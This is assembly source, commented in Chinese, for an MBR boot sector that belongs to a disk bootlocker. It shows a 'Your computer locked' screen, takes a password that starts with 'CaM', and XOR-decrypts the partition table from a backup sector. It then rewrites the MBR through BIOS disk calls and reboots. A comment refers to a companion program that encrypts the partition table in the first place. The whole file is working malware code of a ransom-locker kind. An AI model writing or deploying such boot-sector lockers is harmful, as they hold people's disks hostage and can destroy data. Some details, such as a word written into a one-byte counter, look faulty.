;author:Yebin
;硬盘解锁程序
;
org 0x7c00
start:
mov ax,cs
mov ds,ax
mov ss,ax
mov es,ax
mov sp,0x100		;开辟0x100字节空间
;---------------------------------
main:
	mov bp,Tips		;指向一个字符串   所以该字符串可以不以0结尾
	mov cx,Tips_Len	;字符串长度
	mov ax,0x1301	;显示服务的具体功能描述
	mov bx,0x0c 	;描述了页号（BH=0），BL描述了字体的样式（bl=0xc）
	mov dl,0
	int 0x10 		;调用BIOS的显示服务
	;验证密码
mov ax,0xb800		;显示缓冲区
add ax,0xA0
mov ds,ax			;ds的值为0xb8A0 指向显示器缓存
xor cx,cx			;cx=0
xor bx,bx
	GetChar:
		xor ax,ax
		int 0x16	;键盘中断 
		cmp AL,0x8 	;退格键 if al==0x8
		je back
		cmp al,0x0d ;回车键
		je entry
		mov ah,2	;其他键都当密码
		mov [bx],AL ;bx指向输出的密码
		mov [bx+1],AH
		xor al,al
		mov [bx+2],al
		add bx,2 	;bx指针+2
		inc cx		;cx保存已输入密码的位数
		mov [cs:InputCnt],cx 
	jmp GetChar
	back:
		sub bx,2	;bx指向减2
		dec cx 		;cx长度减1
		mov [cs:InputCnt],cx
		xor ax,ax
		mov [bx],ax
		jmp GetChar
	entry:
		;逐个字符比较
		mov ax,cs
		mov es,ax
		xor bx,bx

		mov al,[ds:bx]	;0xb8A0 输入的密码
		cmp al,'C'
		jne key_err 	;第一位不是C，退出
		add bx,2
		mov al,[ds:bx]	;0xb8A2,输入的密码
		cmp al,'a'		
		jne key_err		;第二位不是a，退出
		add bx,2
		mov al,[ds:bx] ;0xb8A4输出的密码
		cmp al,'M'
		jne key_err 	;第三位不是M，退出
		add bx,2

		mov cl,0xff 	;cl 长度255位
		mov ch,0 		;ch=0
		mov [cs:XResult],ch
	calc_key:
			mov al,[ds:bx]	;第一位有效密码
			cmp al,0
			je fixmbr
			xor [cs:XResult],al
			add bx,2
		loop calc_key
		;密码正确，进行解密工作
		;读取
		fixmbr:
		;fix 0-0x01bd
		;读取
		mov ax,0x7e00 	;初始化
		mov es,ax
		xor bx,bx
		mov ah,0x2 		;功能号，读入
		mov dl,0x80 	;驱动器号
		mov al,1 		;要读入的扇区数量
		mov dh,0 		;磁头号
		mov ch,0 		;柱面 ：CHS寻址方式，磁道号的低八位
		mov cl,3  		;扇区 :开始扇区我们在写加锁程序的时候用的是 LBA寻址方式
		int 0x13  		;es:bx 为数据缓冲区
		;改写MBR
		mov bx,0x01bd 	;第445字节出开始进行清0操作，标记MBR为未加密状态
		xor ch,ch
		mov [es:bx],ch
		mov bx,0x01be 	;第446字节处开始进行XOR解密，共解密64字节（16*4）
		mov cl,64
		decrypt: 		;解密程序
			mov al,[es:bx]
			xor al,[cs:XResult]
			mov [es:bx],al
			inc bx
		loop decrypt
		;写回去
		xor bx,bx
		mov ah,0x3 		;功能号，写回
		mov dl,0x80 	;驱动器号
		mov al,1 		;数量
		mov dh,0 		;磁头
		mov ch,0 		;柱面
		mov cl,1 		;mbr扇区
		int 0x13
		jmp _REST
	key_err:
		mov bx,0xb880
		add bx,Tips_Len
		mov al,"X"
		mov [bx],al
		mov cx,[cs:InputCnt]
		xor ax,ax
		kk:	;对输入的清零
		mov [bx],ax
		add bx,2
		loop kk
		jmp start
	;重启计算机
	_REST:
		mov ax,0xffff
		push ax
		mov ax,0
		push ax
		retf

data:
XResult:  db 0 		;密码异或结果
InputCnt: db 0 		;密码位数
Tips:     db "Your computer locked  by013"
Tips_Len equ $-Tips
times 510-($-$$) db 0xF
dw 0xAA55	;MBR结尾标识符